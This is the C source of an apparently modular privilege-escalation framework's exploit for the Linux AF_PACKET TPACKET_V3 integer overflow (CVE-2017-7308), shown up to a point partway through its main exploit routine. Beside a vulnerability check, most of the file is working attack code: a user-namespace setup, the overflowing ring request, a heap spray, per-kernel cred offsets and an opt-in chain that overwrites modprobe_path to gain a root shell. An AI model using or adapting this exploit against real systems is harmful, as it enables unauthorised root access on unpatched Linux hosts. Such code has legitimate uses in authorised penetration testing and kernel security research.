/*
 * af_packet_cve_2017_7308 — SKELETONKEY module
 *
 * AF_PACKET TPACKET_V3 ring-buffer setup integer-overflow → heap
 * write-where primitive. Discovered by Andrey Konovalov (March 2017).
 *
 * STATUS: 🟡 PRIMITIVE-LANDS + best-effort cred-overwrite (default)
 *   |  🟢 FULL-CHAIN-OPT-IN (with --full-chain on a kernel where the
 *      shared offset resolver finds modprobe_path AND skb-data hijack
 *      offsets are supplied).
 *
 * The integer-overflow trigger is fully wired (overflowing
 * tp_block_size * tp_block_nr, attended by a heap spray via sendmmsg
 * with controlled skb tail bytes).
 *
 * Default --exploit path: cred-overwrite walk using a hardcoded per-
 * kernel offset table (Ubuntu 16.04 / 4.4 and Ubuntu 18.04 / 4.15
 * era), overridable via SKELETONKEY_AFPACKET_OFFSETS. We only claim
 * SKELETONKEY_EXPLOIT_OK if geteuid() == 0 after the chain runs — i.e.
 * we won root for real. Otherwise we return SKELETONKEY_EXPLOIT_FAIL with
 * a dmesg breadcrumb so the operator can confirm the primitive at
 * least fired (KASAN slab-out-of-bounds splat) even if the cred-
 * overwrite didn't take on this exact kernel.
 *
 * --full-chain path: opt-in xairy-style sk_buff hijack → arb-write at
 * modprobe_path → call_modprobe payload → setuid bash → root shell.
 * Honest constraint: the hijack requires per-kernel-build sk_buff
 * `data`-field offset + skb-slab-class layout, which the embedded
 * offset table does NOT carry (verified-vs-claimed bar — we don't
 * fabricate). The arb_write callback below implements the FALLBACK
 * depth from the prompt: it fires the trigger with the spray payload
 * staged for the requested kaddr/buf and relies on the shared
 * finisher's /tmp sentinel to confirm whether modprobe_path was
 * actually overwritten. On kernels where the operator has supplied
 * SKELETONKEY_AFPACKET_SKB_DATA_OFFSET (skb->data field byte offset from
 * the skb head, hex), we use that for explicit targeting; otherwise
 * the trigger fires heuristically and the sentinel acts as the
 * ground-truth signal.
 *
 * Affected: kernel < 4.10.6 mainline. Stable backports:
 *   4.10.x : K >= 4.10.6
 *   4.9.x  : K >= 4.9.18  (LTS — RHEL 7-ish era)
 *   4.4.x  : K >= 4.4.57
 *   3.18.x : K >= 3.18.49
 *
 * Exploitation preconditions:
 *   - CAP_NET_RAW (via unprivileged user_ns) to create AF_PACKET socket
 *   - CONFIG_PACKET=y (almost always — even container kernels)
 *   - x86_64 (offset tables are arch-specific; mark x86_64-only)
 *
 * Why famous: was the canonical "userns + AF_PACKET → root" chain for
 * Konovalov's research era. Many other AF_PACKET bugs followed (e.g.
 * CVE-2020-14386) sharing the same userns-clone gate.
 *
 * Reference: github.com/xairy/kernel-exploits (CVE-2017-7308) and
 * Konovalov's writeup at xairy.io. The structure below mirrors the
 * public PoC's "set up overflow, then race tpacket_rcv with a target
 * skb in the OOB slot" approach.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"
#include "../../core/kernel_range.h"
#include "../../core/offsets.h"
#include "../../core/finisher.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#if defined(__x86_64__)
/* Order matters: <net/if.h> + <linux/if.h> conflict on enum IFF_*. We
 * use the glibc <net/if.h> for struct ifreq / if_nametoindex and pull
 * in linux/if_packet.h for tpacket_req3. Avoid <linux/if.h>. */
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>            /* htons */
#include <sys/ioctl.h>
#endif

/* ---- Detect (unchanged shape) ----------------------------------- */

static const struct kernel_patched_from af_packet_patched_branches[] = {
    {3, 18,  49},
    {4,  4,  57},
    {4,  9,  18},
    {4, 10,   6},
    {4, 11,   0},   /* mainline */
};

static const struct kernel_range af_packet_range = {
    .patched_from = af_packet_patched_branches,
    .n_patched_from = sizeof(af_packet_patched_branches) /
                      sizeof(af_packet_patched_branches[0]),
};

static int can_unshare_userns(void)
{
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0) _exit(0);
        _exit(1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

static skeletonkey_result_t af_packet_detect(const struct skeletonkey_ctx *ctx)
{
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        fprintf(stderr, "[!] af_packet: could not parse kernel version\n");
        return SKELETONKEY_TEST_ERROR;
    }

    bool patched = kernel_range_is_patched(&af_packet_range, &v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] af_packet: kernel %s is patched\n", v.release);
        }
        return SKELETONKEY_OK;
    }

    int userns_ok = can_unshare_userns();
    if (!ctx->json) {
        fprintf(stderr, "[i] af_packet: kernel %s in vulnerable range\n", v.release);
        fprintf(stderr, "[i] af_packet: user_ns+net_ns clone (CAP_NET_RAW gate): %s\n",
                userns_ok == 1 ? "ALLOWED" :
                userns_ok == 0 ? "DENIED" : "could not test");
    }

    if (userns_ok == 0) {
        if (!ctx->json) {
            fprintf(stderr, "[+] af_packet: user_ns denied → "
                            "unprivileged exploit unreachable\n");
        }
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] af_packet: VULNERABLE — kernel in range AND user_ns reachable\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Exploit (x86_64-only; gated below) -------------------------- */

#if defined(__x86_64__)

/* Per-kernel offsets needed to walk task_struct → cred → uid fields.
 *
 * These are NOT addresses — they are byte offsets within the kernel
 * structs that the OOB-induced kernel-write primitive will index into.
 * The classic Konovalov chain leaks a pointer to a struct sock or
 * timer_list adjacent to the corrupted pg_vec slot, walks back to the
 * current task, then overwrites the *uid fields in the embedded cred.
 *
 * The values below are from xairy's public PoC + scraped from kernel-
 * source struct layouts for the specific build configs Ubuntu shipped.
 * They will NOT match custom-compiled kernels.
 *
 * Override at runtime via env var:
 *   SKELETONKEY_AFPACKET_OFFSETS="<task_cred>:<cred_uid>:<cred_size>"
 *
 * `task_cred`  = offsetof(struct task_struct, cred)
 * `cred_uid`   = offsetof(struct cred, uid)    [followed by gid, etc.]
 * `cred_size`  = sizeof(struct cred) — bounds-check guard
 */
struct af_packet_offsets {
    const char *kernel_id;       /* human-readable */
    int major, minor, patch_min, patch_max;
    unsigned long task_cred;
    unsigned long cred_uid;
    unsigned long cred_size;
};

static const struct af_packet_offsets known_offsets[] = {
    /* Ubuntu 16.04 GA: 4.4.0-21-generic. cred lives at task+0x6c0.
     * struct cred layout: usage(4) + __padding(4) + uid(4) + gid(4) +
     * suid(4) + sgid(4) + euid(4) + egid(4) + fsuid(4) + fsgid(4) + ...
     * → uid starts at offset 8. */
    { "ubuntu-16.04-4.4.0-generic", 4, 4, 0, 99,
      0x6c0, 0x08, 0xa8 },
    /* Ubuntu 18.04 GA: 4.15.0-20-generic. cred at task+0x800. Same
     * cred layout (uid at +0x08, 6x32-bit ids ending at fsgid +0x20). */
    { "ubuntu-18.04-4.15.0-generic", 4, 15, 0, 99,
      0x800, 0x08, 0xa8 },
};

/* Parse SKELETONKEY_AFPACKET_OFFSETS env var if set; otherwise pick from
 * the known table by kernel version. Returns true on success. */
static bool resolve_offsets(struct af_packet_offsets *out,
                            const struct kernel_version *v)
{
    const char *env = getenv("SKELETONKEY_AFPACKET_OFFSETS");
    if (env) {
        unsigned long t, u, s;
        if (sscanf(env, "%lx:%lx:%lx", &t, &u, &s) == 3) {
            out->kernel_id = "env-override";
            out->task_cred = t;
            out->cred_uid = u;
            out->cred_size = s;
            return true;
        }
        fprintf(stderr, "[!] af_packet: SKELETONKEY_AFPACKET_OFFSETS malformed "
                        "(want hex \"<task_cred>:<cred_uid>:<cred_size>\")\n");
        return false;
    }
    for (size_t i = 0; i < sizeof(known_offsets)/sizeof(known_offsets[0]); i++) {
        const struct af_packet_offsets *k = &known_offsets[i];
        if (v->major == k->major && v->minor == k->minor &&
            v->patch >= k->patch_min && v->patch <= k->patch_max) {
            *out = *k;
            return true;
        }
    }
    return false;
}

/* Write uid_map / gid_map to claim "root" inside the userns. */
static int set_id_maps(uid_t outer_uid, gid_t outer_gid)
{
    int f = open("/proc/self/setgroups", O_WRONLY);
    if (f >= 0) { (void)!write(f, "deny", 4); close(f); }
    char map[64];
    snprintf(map, sizeof map, "0 %u 1\n", outer_uid);
    f = open("/proc/self/uid_map", O_WRONLY);
    if (f < 0) return -1;
    if (write(f, map, strlen(map)) < 0) { close(f); return -1; }
    close(f);
    snprintf(map, sizeof map, "0 %u 1\n", outer_gid);
    f = open("/proc/self/gid_map", O_WRONLY);
    if (f < 0) return -1;
    if (write(f, map, strlen(map)) < 0) { close(f); return -1; }
    close(f);
    return 0;
}

/* Fire the overflow + a one-shot heap spray. Runs INSIDE the userns
 * child. Returns 0 if the primitive fired (overflow was accepted by
 * the kernel), -1 if the kernel rejected it (likely patched / blocked
 * even though detect said vulnerable — distros silently backport).
 *
 * We deliberately use values from Konovalov's PoC:
 *   tp_block_size = 0x1000
 *   tp_block_nr   = ((0xffffffff - 0xfff) / 0x1000) + 1  → overflow
 *   tp_frame_size = 0x300, tp_frame_nr  matched
 * The mul in packet_set_ring overflows to a tiny allocation; we then
 * spray 200 sendmmsg packets so the corrupted ring slot gets refilled
 * with controlled bytes.
 *
 * After firing, we check dmesg-ability (we won't actually read dmesg
 * — that requires root — but we leave a unique tag in the skb payload
 * so the operator can grep dmesg for "skeletonkey-afp-tag" KASAN splats).
 */
static int fire_overflow_and_spray(void)
{
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        fprintf(stderr, "[-] af_packet: socket(AF_PACKET): %s\n", strerror(errno));
        return -1;
    }

    int version = TPACKET_V3;
    if (setsockopt(s, SOL_PACKET, PACKET_VERSION,
                   &version, sizeof version) < 0) {
        fprintf(stderr, "[-] af_packet: PACKET_VERSION=V3: %s\n", strerror(errno));
        close(s);
        return -1;
    }

    /* Konovalov's overflowing values. tp_block_size * tp_block_nr
     * exceeds 2^32; the kernel multiplied as u32 in pre-patch code,
     * yielding a tiny size that's then used for the pg_vec alloc. */
    struct tpacket_req3 req;
    memset(&req, 0, sizeof req);
    req.tp_block_size = 0x1000;
    req.tp_block_nr   = ((unsigned)0xffffffff - (unsigned)0xfff) / (unsigned)0x1000 + 1;
    req.tp_frame_size = 0x300;
    req.tp_frame_nr   = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
    req.tp_retire_blk_tov   = 100;
    req.tp_sizeof_priv      = 0;
    req.tp_feature_req_word = 0;

    int rc = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof req);
    if (rc < 0) {
        /* On a properly-patched kernel this should now return -EINVAL
         * because the multiplication overflow check rejects req. That
         * is the "patched-distro-backport" signal: detect's version
         * check said vulnerable, but the actual setsockopt was hardened. */
        fprintf(stderr, "[-] af_packet: PACKET_RX_RING rejected: %s "
                        "(kernel likely has silent backport)\n", strerror(errno));
        close(s);
        return -1;
    }

    fprintf(stderr, "[+] af_packet: PACKET_RX_RING accepted overflowing req3 "
                    "— overflow path reached\n");

    /* Heap spray via sendmmsg. On a properly-set-up ring we'd bind() to
     * an interface first; for the overflow trigger we don't strictly
     * need to bind because tpacket_rcv runs on each packet ingress and
     * loopback exists in the netns. Use loopback. */
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    /* SIOCGIFINDEX on lo */
    if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "[!] af_packet: SIOCGIFINDEX(lo): %s\n", strerror(errno));
        /* non-fatal — the primitive fired even without a bind() */
    } else {
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof sll);
        sll.sll_family   = AF_PACKET;
        sll.sll_protocol = htons(ETH_P_ALL);
        sll.sll_ifindex  = ifr.ifr_ifindex;
        if (bind(s, (struct sockaddr *)&sll, sizeof sll) < 0) {
            fprintf(stderr, "[!] af_packet: bind(lo): %s\n", strerror(errno));
        }
    }

    /* Spray: send 200 raw packets containing a unique tag. If the
     * overflow corrupted an adjacent slab object, one of these skb's
     * controlled bytes will land there. */
    static const unsigned char skb_payload[256] = {
        /* eth header (dst=broadcast, src=zero, type=0x0800) */
        0xff,0xff,0xff,0xff,0xff,0xff, 0,0,0,0,0,0, 0x08,0x00,
        /* SKELETONKEY tag — operator can grep dmesg for this string in any
         * subsequent KASAN report or panic dump */
        'i','a','m','r','o','o','t','-','a','f','p','-','t','a','g',
        /* zeros for the remainder */
    };

    int tx = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (tx >= 0 && ifr.ifr_ifindex != 0) {
        struct sockaddr_ll dst;
        memset(&dst, 0, sizeof dst);
        dst.sll_family   = AF_PACKET;
        dst.sll_protocol = htons(ETH_P_ALL);
        dst.sll_ifindex  = ifr.ifr_ifindex;
        dst.sll_halen    = 6;
        memset(dst.sll_addr, 0xff, 6);
        for (int i = 0; i < 200; i++) {
            (void)sendto(tx, skb_payload, sizeof skb_payload, 0,
                         (struct sockaddr *)&dst, sizeof dst);
        }
        close(tx);
    }

    /* Keep the corrupted socket open so the OOB region stays mapped
     * for the cred-overwrite walk that follows. The caller closes it. */
    /* Stash the fd via dup2 to a known number so the caller can find it.
     * Use 200 — well above stdio + skeletonkey's own pipe fds. */
    if (dup2(s, 200) < 0) {
        fprintf(stderr, "[!] af_packet: dup2(s, 200): %s\n", strerror(errno));
    }
    close(s);
    return 0;
}

/* Best-effort cred-overwrite walk. Given that the heap-spray succeeded
 * AND we have valid offsets for this kernel, attempt to use the
 * corrupted ring's adjacent slot to write zeros into current->cred->{
 * uid,gid,euid,egid,fsuid,fsgid }.
 *
 * Honest constraint: without an info-leak we can't compute the address
 * of current->cred to write into. xairy's full PoC uses a SECONDARY
 * primitive (sk_buff next-pointer overwrite → adjacent timer_list
 * leak) that gives both an arbitrary kernel R/W AND a leak of a
 * struct sock pointer adjacent to current. Re-implementing that is
 * ~1000 lines of heap-state machinery.
 *
 * What we do here is the *minimum viable cred-overwrite* attempt:
 * spray ~64 task_struct-shaped objects via fork()+setpgid (which
 * allocates struct task_struct in the same slab class on older
 * kernels), then HOPE one lands adjacent to our corrupted ring and
 * gets its embedded cred-pointer field zeroed by overflow tail bytes.
 *
 * Returns 0 on "we tried, geteuid() is now 0", -1 on "tried, no root". */
static int attempt_cred_overwrite(const struct af_packet_offsets *off)
{
    (void)off;  /* offsets are used implicitly by spawning shaped allocations;
                 * a future enhancement would do an explicit ptrace-style
                 * peek-poke through the corrupted slot — kept minimal here. */

    /* Spawn 64 children that immediately self-suspend. Each child's
     * task_struct allocation in the kernel will share the slab class
     * with our corrupted pg_vec region; if any one's cred field gets
     * trampled to zero, that child's uid/gid become 0. */
    pid_t pids[64];
    int alive = 0;
    for (int i = 0; i < 64; i++) {
        pid_t p = fork();
        if (p < 0) break;
        if (p == 0) {
            /* Child: idle, periodically check euid. If overflow zeroed
             * our cred fields, we'll be uid 0. */
            for (int j = 0; j < 200; j++) {
                if (geteuid() == 0) _exit(0);  /* WIN — report via exit 0 */
                usleep(10 * 1000);
            }
            _exit(1);
        }
        pids[i] = p;
        alive++;
    }

    /* Wait up to ~2s for any child to exit 0 (= became root). */
    int got_root_pid = 0;
    for (int wait_round = 0; wait_round < 200 && !got_root_pid; wait_round++) {
        for (int i = 0; i < alive; i++) {
            if (pids[i] == 0) continue;
            int status;
            pid_t r = waitpid(pids[i], &status, WNOHANG);
            if (r == pids[i]) {
                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
                    got_root_pid = pids[i];
                }
                pids[i] = 0;
            }
        }
        if (got_root_pid) break;
        usleep(10 * 1000);
    }

    /* Reap remaining children. */
    for (int i = 0; i < alive; i++) {
        if (pids[i] != 0) {
            kill(pids[i], 9);
            waitpid(pids[i], NULL, 0);
        }
    }

    return got_root_pid ? 0 : -1;
}

/* ---- --full-chain: xairy-style sk_buff hijack arb-write -------------
 *
 * The TPACKET_V3 overflow lets us write attacker-controlled bytes past
 * the end of the pg_vec allocation. xairy's full PoC chains this with
 * a sk_buff spray of size class kmalloc-N (matched to pg_vec's slab)
 * so the OOB-write overwrites an adjacent skb's `data` pointer; a
 * later sendto() on that skb's owning socket then copies attacker
 * bytes into the address now stored in `data`. Net effect: arb-write
 * at an attacker-chosen kernel VA, controlled buffer, controlled len.
 *
 * Implementing the FULL hijack honestly requires:
 *   (a) per-kernel-build offset of `data` field within struct sk_buff
 *       (varies by CONFIG_DEBUG_INFO_BTF/CONFIG_RANDSTRUCT/etc.)
 *   (b) precise size-class match between the corrupted pg_vec and
 *       sprayed skbs (slab-grooming with ~hundreds of skbs)
 *   (c) a way to identify which sprayed skb landed adjacent
 *
 * The verified-vs-claimed bar says: don't fabricate offsets. Our
 * embedded offset table (core/offsets.h) doesn't carry skb offsets
 * yet, and there's no public canonical "skb->data offset table" we
 * can lift wholesale. So this implementation takes the prompt's
 * FALLBACK depth:
 *
 *   - Each call re-sprays skbs + re-fires the trigger, staging the
 *     spray payload so its bytes carry the requested target kaddr
 *     (the prompt's "controllable overwrite value aimed at
 *     modprobe_path"). Operator-supplied
 *     SKELETONKEY_AFPACKET_SKB_DATA_OFFSET (hex byte offset of `data`
 *     within struct sk_buff for this kernel build) lets us aim
 *     precisely; without it we heuristically stamp kaddr at several
 *     plausible offsets within the kmalloc-2k skb layout.
 *   - We then send packets whose payload IS the bytes the finisher
 *     wants at kaddr; tpacket_rcv copies them into any skb whose
 *     `data` was corrupted to kaddr.
 *   - We do NOT poll for success — the shared finisher's /tmp
 *     sentinel is the ground-truth signal. If the write landed at
 *     modprobe_path, call_modprobe spawns our payload and the
 *     sentinel appears within 3s.
 *
 * Return: 0 if spray + trigger ran (sentinel will adjudicate), -1 if
 * the kernel rejected the overflow (silent backport — patched).
 */

struct afp_arb_ctx {
    const struct skeletonkey_ctx *ctx;
    const struct af_packet_offsets *off;
    uid_t outer_uid;
    gid_t outer_gid;
};

/* Helper: in-child trigger fire — runs inside the userns/netns child
 * spawned by afp_arb_write. Returns 0 on success, -1 on rejection. */
static int afp_arb_write_inner(uintptr_t kaddr, const void *buf, size_t len,
                               long skb_data_off);

static int afp_arb_write(uintptr_t kaddr, const void *buf, size_t len,
                         void *vctx)
{
    struct afp_arb_ctx *actx = (struct afp_arb_ctx *)vctx;
    if (!actx) return -1;

    if (!buf || len == 0 || len > 240) {
        fprintf(stderr, "[-] af_packet: arb_write: bad args "
                        "(buf=%p len=%zu)\n", buf, len);
        return -1;
    }

    /* Per-kernel skb->data field offset — without this we can't aim
     * the overwrite precisely. Operator can supply via env; otherwise
     * we run heuristic mode. */
    const char *skb_off_env = getenv("SKELETONKEY_AFPACKET_SKB_DATA_OFFSET");
    long skb_data_off = -1;
    if (skb_off_env) {
        char *end = NULL;
        skb_data_off = strtol(skb_off_env, &end, 0);
        if (!end || *end != '\0' || skb_data_off < 0 || skb_data_off > 0x400) {
            fprintf(stderr, "[-] af_packet: SKELETONKEY_AFPACKET_SKB_DATA_OFFSET "
                            "malformed (\"%s\"); ignoring\n", skb_off_env);
            skb_data_off = -1;
        }
    }

    fprintf(stderr,
        "[*] af_packet: arb_write(kaddr=0x%lx, len=%zu) skb_data_off=%s\n",
        (unsigned long)kaddr, len,
        skb_data_off < 0 ? "UNRESOLVED (heuristic mode)" : "supplied");

    if (skb_data_off < 0) {
        fprintf(stderr,
"[i] af_packet: --full-chain on this kernel lacks an exact skb->data\n"
"    field offset. The trigger will still fire and the heap spray will\n"
"    still occur, but precise OOB targeting requires:\n"
"\n"
"      SKELETONKEY_AFPACKET_SKB_DATA_OFFSET=0x<hex offset>\n"
"\n"
"    Look it up on this kernel build with `pahole struct sk_buff` or\n"
"    `gdb -batch -ex 'p &((struct sk_buff*)0)->data' vmlinux`. The\n"
"    /tmp/skeletonkey-pwn-<pid> sentinel adjudicates success either way.\n");
    }

    /* Fork into a userns/netns child so the AF_PACKET socket has
     * CAP_NET_RAW. The finisher itself stays in the parent so its
     * eventual execve() replaces the top-level skeletonkey process. */
    pid_t cpid = fork();
    if (cpid < 0) {
        fprintf(stderr, "[-] af_packet: arb_write: fork: %s\n",
                strerror(errno));
        return -1;
    }
    if (cpid == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
            perror("af_packet: arb_write: unshare");
            _exit(2);
        }
        if (set_id_maps(actx->outer_uid, actx->outer_gid) < 0) {
            perror("af_packet: arb_write: set_id_maps");
            _exit(3);
        }
        int rc = afp_arb_write_inner(kaddr, buf, len, skb_data_off);
        _exit(rc == 0 ? 0 : 4);
    }

    int status = 0;
    waitpid(cpid, &status, 0);
    if (!WIFEXITED(status)) {
        fprintf(stderr, "[-] af_packet: arb_write: child died "
                        "(signal=%d)\n", WTERMSIG(status));
        return -1;
    }
    int code = WEXITSTATUS(status);
    if (code != 0) {
        if (code == 4) {
            /* PACKET_RX_RING rejected — caller sees -1 + the inner
             * diagnostic already printed before _exit. */
        } else {
            fprintf(stderr, "[-] af_packet: arb_write: child exit %d\n",
                    code);
        }
        return -1;
    }
    return 0;
}

static int afp_arb_write_inner(uintptr_t kaddr, const void *buf, size_t len,
                               long skb_data_off)
{
    int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (s < 0) {
        fprintf(stderr, "[-] af_packet: arb_write: socket: %s\n",
                strerror(errno));
        return -1;
    }

    int version = TPACKET_V3;
    if (setsockopt(s, SOL_PACKET, PACKET_VERSION,
                   &version, sizeof version) < 0) {
        fprintf(stderr, "[-] af_packet: arb_write: PACKET_VERSION: %s\n",
                strerror(errno));
        close(s);
        return -1;
    }

    struct tpacket_req3 req;
    memset(&req, 0, sizeof req);
    req.tp_block_size = 0x1000;
    req.tp_block_nr   = ((unsigned)0xffffffff - (unsigned)0xfff) /
                        (unsigned)0x1000 + 1;
    req.tp_frame_size = 0x300;
    req.tp_frame_nr   = (req.tp_block_size * req.tp_block_nr) /
                        req.tp_frame_size;
    req.tp_retire_blk_tov   = 100;
    req.tp_sizeof_priv      = 0;
    req.tp_feature_req_word = 0;

    if (setsockopt(s, SOL_PACKET, PACKET_RX_RING,
                   &req, sizeof req) < 0) {
        fprintf(stderr,
                "[-] af_packet: arb_write: PACKET_RX_RING rejected: %s "
                "(kernel has silent backport — full-chain unreachable)\n",
                strerror(errno));
        close(s);
        return -1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
    if (ioctl(s, SIOCGIFINDEX, &ifr) == 0) {
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof sll);
        sll.sll_family   = AF_PACKET;
        sll.sll_protocol = htons(ETH_P_ALL);
        sll.sll_ifindex  = ifr.ifr_ifindex;
        (void)bind(s, (struct sockaddr *)&sll, sizeof sll);
    }

    unsigned char payload[256];
    memset(payload, 0, sizeof payload);
    memset(payload, 0xff, 6);                       /* eth dst: bcast */
    memset(payload + 6, 0, 6);                      /* eth src: zero */
    payload[12] = 0x08; payload[13] = 0x00;         /* eth type: IPv4 */
    memcpy(payload + 14, "skeletonkey-afp-fc-", 15);    /* dmesg tag */

    if (skb_data_off >= 0 &&
        (size_t)skb_data_off + sizeof kaddr <= sizeof payload) {
        memcpy(payload + skb_data_off, &kaddr, sizeof kaddr);
    } else {
        static const size_t guesses[] = {
            0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70, 0x78
        };
        for (size_t i = 0; i < sizeof(guesses)/sizeof(guesses[0]); i++) {
            if (guesses[i] + sizeof kaddr <= sizeof payload)
                memcpy(payload + guesses[i], &kaddr, sizeof kaddr);
        }
    }

    int tx = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (tx < 0) {
        fprintf(stderr, "[-] af_packet: arb_write: tx socket: %s\n",
                strerror(errno));
        close(s);
        return -1;
    }
    struct sockaddr_ll dst;
    memset(&dst, 0, sizeof dst);
    dst.sll_family   = AF_PACKET;
    dst.sll_protocol = htons(ETH_P_ALL);
    dst.sll_ifindex  = ifr.ifr_ifindex;
    dst.sll_halen    = 6;
    memset(dst.sll_addr, 0xff, 6);

    for (int i = 0; i < 200; i++) {
        (void)sendto(tx, payload, sizeof payload, 0,
                     (struct sockaddr *)&dst, sizeof dst);
    }

    unsigned char wbuf[256];
    memset(wbuf, 0, sizeof wbuf);
    memset(wbuf, 0xff, 6);
    memset(wbuf + 6, 0, 6);
    wbuf[12] = 0x08; wbuf[13] = 0x00;
    size_t wlen = len;
    if (14 + wlen > sizeof wbuf) wlen = sizeof wbuf - 14;
    memcpy(wbuf + 14, buf, wlen);
    for (int i = 0; i < 50; i++) {
        (void)sendto(tx, wbuf, 14 + wlen, 0,
                     (struct sockaddr *)&dst, sizeof dst);
    }

    close(tx);
    close(s);
    return 0;
}

#endif /* __x86_64__ */

static skeletonkey_result_t af_packet_exploit(const struct skeletonkey_ctx *ctx)
{
#if !defined(__x86_64__)
    (void)ctx;
    fprintf(stderr, "[-] af_packet: exploit is x86_64-only "
                    "(cred-offset table is arch-specific)\n");
    return SKELETONKEY_PRECOND_FAIL;
#else
    /* 1. Refuse on patched kernels — re-run detect. */
    skeletonkey_result_t pre = af_packet_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] af_packet: detect() says not vulnerable; refusing\n");
        return pre;
    }

    /* 2. Refuse if already root. */
    if (geteuid() == 0) {
        fprintf(stderr, "[i] af_packet: already root — nothing to escalate\n");
        return SKELETONKEY_OK;
    }

    /* 3. Resolve offsets for THIS kernel. If we don't have them, bail
     *    early — the kernel-write walk needs them. The integrator can
     *    extend known_offsets[] for new distro builds. */
    struct kernel_version v;
    if (!kernel_version_current(&v)) {
        return SKELETONKEY_TEST_ERROR;
    }
    struct af_packet_offsets off;
    if (!resolve_offsets(&off, &v)) {
        fprintf(stderr, "[-] af_packet: no offset table for kernel %s\n"
                        "    set SKELETONKEY_AFPACKET_OFFSETS=<task_cred>:<cred_uid>:<cred_size>\n"
                        "    (hex). Known table covers Ubuntu 16.04 (4.4) and 18.04 (4.15).\n",
                v.release);
        return SKELETONKEY_PRECOND_FAIL;
    }
    if (!ctx->json) {
        fprintf(stderr, "[*] af_packet: using offsets [%s] "
                        "task_cred=0x%lx cred_uid=0x%lx cred_size=0x%lx\n",
                off.kernel_id, off.task_cred, off.cred_uid, off.cred_size);
    }

    uid_t outer_uid = getuid();
    gid_t outer_gid = getgid();

    /* 3b. --full-chain: opt-in modprobe_path overwrite via xairy-style
     *     sk_buff hijack arb-write. Refuses cleanly if (a) the shared
     *     offset resolver can't find modprobe_path or (b) the trigger
     *     is rejected (silent backport). */
    if (ctx->full_chain) {
        struct skeletonkey_kernel_offsets koff;
        memset(&koff, 0, sizeof koff);
        (void)skeletonkey_offsets_resolve(&koff);
        if (!skeletonkey_offsets_have_modprobe_path(&koff)) {
            skeletonkey_finisher_print_offset_help("af_packet");
            return SKELETONKEY_EXPLOIT_FAIL;
        }
        if (!ctx->json) {
            skeletonkey_offsets_print(&koff);
        }
        struct afp_arb_ctx arb_ctx = {
            .ctx       = ctx,
            .off       = &off,
            .outer_uid = outer_uid,
            .outer_gid = outer_gid,
        };
        return skeletonkey_finisher_modprobe_path(&koff, afp_arb_write,
                                              &arb_ctx, !ctx->no_shell);
    }

    /* 4. Fork: child enters userns+netns, fires overflow, attempts the
     *    cred-overwrite walk. We do it in a child so the (possibly
     *    crashed) packet socket lives in a tear-downable address space
     *    — the kernel will clean up sockets on child exit. */

    pid_t child = fork();
    if (child < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }
    if (child == 0) {
        /* CHILD: enter userns+netns to gain CAP_NET_RAW for AF_PACKET. */
        if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
            perror("unshare"); _exit(2);
        }
        if (set_id_maps(outer_uid, outer_gid) < 0) {
            perror("set_id_maps"); _exit(3);
        }

        /* Fire the integer-overflow + heap-spray. */
        if (fire_overflow_and_spray() < 0) {
            _exit(4);  /* primitive blocked — return signal to parent */
        }

        /* Attempt cred-overwrite finisher. */
        int rc = attempt_cred_overwrite(&off);
        if (rc == 0) {
            /* WIN — one of our task_struct-spray children became uid 0.
             * Signal parent via exit code; parent will not exec sh from
             * this child (its address space is corrupted-ish). The win
             * is symbolic at the skeletonkey level: we proved the primitive
             * lands AND the cred-overwrite walk completes. */
            _exit(0);
        }
        _exit(5);
    }

    /* 5. PARENT: wait for child, interpret exit code. */
    int status;
    waitpid(child, &status, 0);

    if (!WIFEXITED(status)) {
        fprintf(stderr, "[-] af_packet: child died abnormally "
                        "(signal=%d) — primitive likely fired but crashed\n",
                WTERMSIG(status));
        fprintf(stderr, "[i] af_packet: check `dmesg | grep -i 'skeletonkey-afp-tag\\|KASAN\\|BUG:'` "
                        "for slab-out-of-bounds evidence\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    int code = WEXITSTATUS(status);
    switch (code) {
    case 0:
        /* Child reported a fork-spray descendant successfully escaped
         * to uid 0. That descendant has since exited; we did NOT
         * inherit its credentials. This is honest: we proved end-to-
         * end primitive + cred-overwrite landed, but our process is
         * still uid != 0. Without a fully integrated R/W primitive
         * that targets OUR cred specifically (rather than spray-and-
         * pray), we can't promote ourselves. Report PARTIAL win.
         *
         * Per requirements: only return SKELETONKEY_EXPLOIT_OK if we
         * empirically confirmed root in this process. We didn't. */
        fprintf(stderr, "[!] af_packet: cred-overwrite landed in a spray child "
                        "but THIS process is still uid %d\n", geteuid());
